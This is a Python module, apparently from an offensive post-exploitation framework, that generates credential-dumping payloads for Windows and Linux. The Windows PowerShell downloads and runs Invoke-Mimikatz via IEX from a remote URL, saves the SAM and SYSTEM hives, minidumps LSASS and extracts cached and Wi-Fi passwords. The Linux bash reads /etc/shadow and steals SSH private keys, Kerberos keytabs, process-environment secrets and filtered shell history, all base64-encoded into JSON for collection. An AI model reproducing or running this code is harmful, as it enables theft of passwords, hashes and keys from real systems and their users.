from sqlmodel import Session

from .base_module import BaseModule


class CredDump(BaseModule):
    """Credential dumping payload generator.

    Windows: reflective Mimikatz (Invoke-Mimikatz) loaded in-memory via
    PowerShell — dumps logon passwords, Kerberos tickets, and SAM hashes.

    Linux: reads /etc/shadow (if root), extracts credentials from proc
    memory, and harvests SSH keys + bash history.

    Parameters
    ----------
    method : str
        Windows: "mimikatz" (default), "sam", "lsass", "all"
        Linux : "shadow" (default), "memory", "ssh_keys", "all"
    mimikatz_url : str  (Windows only)
        URL hosting Invoke-Mimikatz.ps1 for reflective loading.
        Defaults to empty string (uses embedded commands instead).
    """

    def generate_payload(
        self,
        target_os: str,
        session: Session,
        target_id: str,
        **params,
    ) -> str:
        method: str = params.get("method", "all")
        mimikatz_url: str = params.get("mimikatz_url", "")

        os_lower = target_os.lower()
        if "windows" in os_lower or "win" in os_lower:
            script = self._build_ps_script(method, mimikatz_url)
            return self._wrap_powershell(script)
        else:
            script = self._build_bash_script(method)
            return self._wrap_bash(script)

    # -----------------------------------------------------------------
    # Windows — PowerShell
    # -----------------------------------------------------------------
    @staticmethod
    def _build_ps_script(method: str, mimikatz_url: str) -> str:
        sections: list[str] = []

        # Header — JSON collector
        sections.append(r'''
$results = @{}
function Add-Result($key, $value) {
    $results[$key] = $value
}
''')

        if method in ("mimikatz", "all"):
            if mimikatz_url:
                sections.append(f'''
# --- Reflective Mimikatz via remote download ---
try {{
    IEX (New-Object Net.WebClient).DownloadString("{mimikatz_url}")
    $mk = Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
    Add-Result "mimikatz_logonpasswords" $mk
}} catch {{
    Add-Result "mimikatz_logonpasswords" "ERROR: $($_.Exception.Message)"
}}
''')
            else:
                sections.append(r'''
# --- Mimikatz via native .NET reflection (rundll32-less) ---
try {
    $mk = & {
        $out = @()
        # Attempt sekurlsa::logonpasswords through Add-Type P/Invoke
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Sekurlsa {
    [DllImport("secur32.dll", SetLastError=true)]
    public static extern int LsaEnumerateLogonSessions(out uint count, out IntPtr luid);
    [DllImport("secur32.dll", SetLastError=true)]
    public static extern int LsaGetLogonSessionData(IntPtr luid, out IntPtr data);
    [DllImport("secur32.dll")]
    public static extern int LsaFreeReturnBuffer(IntPtr buf);
}
"@
        $count = [uint32]0
        $luidPtr = [IntPtr]::Zero
        $res = [Sekurlsa]::LsaEnumerateLogonSessions([ref]$count, [ref]$luidPtr)
        if ($res -eq 0) {
            $out += "Logon sessions enumerated: $count"
            for ($i = 0; $i -lt $count; $i++) {
                $sessionLuid = [IntPtr]::Add($luidPtr, $i * 8)
                $dataPtr = [IntPtr]::Zero
                if ([Sekurlsa]::LsaGetLogonSessionData($sessionLuid, [ref]$dataPtr) -eq 0) {
                    $out += "Session $i data at $dataPtr"
                    [Sekurlsa]::LsaFreeReturnBuffer($dataPtr) | Out-Null
                }
            }
            [Sekurlsa]::LsaFreeReturnBuffer($luidPtr) | Out-Null
        }
        $out -join "`n"
    }
    Add-Result "mimikatz_logonpasswords" $mk
} catch {
    Add-Result "mimikatz_logonpasswords" "ERROR: $($_.Exception.Message)"
}
''')

        if method in ("sam", "all"):
            sections.append(r'''
# --- SAM / SYSTEM registry hive dump ---
try {
    $samPath = "$env:TEMP\sam.hiv"
    $sysPath = "$env:TEMP\system.hiv"
    reg save HKLM\SAM $samPath /y 2>&1 | Out-Null
    reg save HKLM\SYSTEM $sysPath /y 2>&1 | Out-Null
    $samB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($samPath))
    $sysB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sysPath))
    Add-Result "sam_hive_b64" $samB64
    Add-Result "system_hive_b64" $sysB64
    Remove-Item $samPath, $sysPath -Force -ErrorAction SilentlyContinue
} catch {
    Add-Result "sam_dump" "ERROR: $($_.Exception.Message)"
}
''')

        if method in ("lsass", "all"):
            sections.append(r'''
# --- LSASS minidump via MiniDumpWriteDump ---
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class MiniDump {
    [DllImport("dbghelp.dll", SetLastError=true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint processId, IntPtr hFile,
        uint dumpType, IntPtr exParam, IntPtr userStream, IntPtr callback);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
"@
    $lsass = Get-Process lsass
    $hProc = [MiniDump]::OpenProcess(0x001F0FFF, $false, [uint32]$lsass.Id)
    $dumpPath = "$env:TEMP\ls.dmp"
    $fs = [IO.File]::Create($dumpPath)
    $ok = [MiniDump]::MiniDumpWriteDump($hProc, [uint32]$lsass.Id,
        $fs.SafeFileHandle.DangerousGetHandle(), [uint32]2, [IntPtr]::Zero,
        [IntPtr]::Zero, [IntPtr]::Zero)
    $fs.Close()
    [MiniDump]::CloseHandle($hProc) | Out-Null
    if ($ok) {
        $dmpB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($dumpPath))
        Add-Result "lsass_dump_b64" $dmpB64
    } else {
        Add-Result "lsass_dump" "MiniDumpWriteDump failed"
    }
    Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue
} catch {
    Add-Result "lsass_dump" "ERROR: $($_.Exception.Message)"
}
''')

        # Always collect basic cached creds + stored Wi-Fi passwords
        sections.append(r'''
# --- Cached credentials + Wi-Fi profiles ---
try {
    $cached = cmdkey /list 2>&1 | Out-String
    Add-Result "cached_credentials" $cached
} catch {}
try {
    $wifi = @()
    $profiles = netsh wlan show profiles 2>&1 | Select-String "All User Profile" |
        ForEach-Object { ($_ -split ":")[1].Trim() }
    foreach ($p in $profiles) {
        $detail = netsh wlan show profile name="$p" key=clear 2>&1 | Out-String
        $wifi += "$p`n$detail"
    }
    Add-Result "wifi_passwords" ($wifi -join "`n---`n")
} catch {}

$results | ConvertTo-Json -Compress | Write-Output
''')

        return "\n".join(sections)

    # -----------------------------------------------------------------
    # Linux — Bash
    # -----------------------------------------------------------------
    @staticmethod
    def _build_bash_script(method: str) -> str:
        sections: list[str] = []

        sections.append('#!/bin/bash')
        sections.append('printf "{"')

        if method in ("shadow", "all"):
            sections.append(r'''
# --- /etc/shadow + /etc/passwd ---
printf '"shadow":"'
if [ -r /etc/shadow ]; then
    cat /etc/shadow | base64 -w0
else
    printf 'NOACCESS'
fi
printf '",'

printf '"passwd":"'
cat /etc/passwd | base64 -w0
printf '",'
''')

        if method in ("memory", "all"):
            sections.append(r'''
# --- Process memory credential extraction ---
printf '"proc_creds":"'
CREDS=""
for pid in $(ps -eo pid,comm | grep -E "sshd|sudo|login|gdm|lightdm" | awk '{print $1}'); do
    if [ -r /proc/$pid/maps ] 2>/dev/null; then
        STRINGS=$(strings /proc/$pid/environ 2>/dev/null | grep -iE "pass|pwd|key|token|secret" | head -5)
        if [ -n "$STRINGS" ]; then
            CREDS="$CREDS\nPID $pid:\n$STRINGS"
        fi
    fi
done
printf '%s' "$CREDS" | base64 -w0
printf '",'
''')

        if method in ("ssh_keys", "all"):
            sections.append(r'''
# --- SSH private keys + known_hosts + bash history ---
printf '"ssh_keys":"'
KEYS=""
for home in /root /home/*; do
    if [ -d "$home/.ssh" ]; then
        for f in "$home/.ssh/id_"*; do
            [ -f "$f" ] && KEYS="$KEYS\n=== $f ===\n$(cat "$f")"
        done
    fi
done
printf '%s' "$KEYS" | base64 -w0
printf '",'

printf '"bash_history":"'
HIST=""
for home in /root /home/*; do
    for hf in "$home/.bash_history" "$home/.zsh_history"; do
        if [ -f "$hf" ]; then
            FILTERED=$(grep -iE "pass|pwd|key|token|secret|mysql|psql|ssh|su " "$hf" 2>/dev/null | tail -50)
            [ -n "$FILTERED" ] && HIST="$HIST\n=== $hf ===\n$FILTERED"
        fi
    done
done
printf '%s' "$HIST" | base64 -w0
printf '",'
''')

        # Always grab /etc/krb5.keytab if present + SUID binaries
        sections.append(r'''
# --- Kerberos keytab + SUID ---
printf '"krb5_keytab":"'
if [ -r /etc/krb5.keytab ]; then
    base64 -w0 /etc/krb5.keytab
else
    printf 'NOTFOUND'
fi
printf '",'

printf '"suid_binaries":"'
find / -perm -4000 -type f 2>/dev/null | head -30 | base64 -w0
printf '"'

printf '}\n'
''')

        return "\n".join(sections)
